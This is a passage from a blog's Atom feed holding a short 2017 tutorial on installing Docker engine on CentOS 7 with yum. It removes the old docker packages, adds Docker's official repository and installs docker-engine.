    <id>http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/</id>
    <published>2017-02-28T05:32:27.000Z</published>
    <updated>2017-03-06T06:54:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Remove-default-docker-package"><a href="#1-Remove-default-docker-package" class="headerlink" title="1.Remove default docker package."></a>1.Remove default docker package.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum -y remove docker docker-common container-selinux</div><div class="line">yum -y remove docker-selinux</div></pre></td></tr></table></figure>
<h2 id="2-Install-Docker-engine"><a href="#2-Install-Docker-engine" class="headerlink" title="2.Install Docker engine"></a>2.Install Docker engine</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">yum install -y yum-utils</div><div class="line">yum-config-manager --add-repo https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repo</div><div class="line">yum-config-manager --enable docker-testing</div><div class="line">yum-config-manager --disable docker-testing</div><div class="line">yum makecache fast</div><div class="line">yum -y install docker-engine</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Remove-default-docker-package&quot;&gt;&lt;a href=&quot;#1-Remove-default-docker-package&quot; class=&quot;headerlink&quot; title=&quot;1.Remove default docker packag
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
</feed>
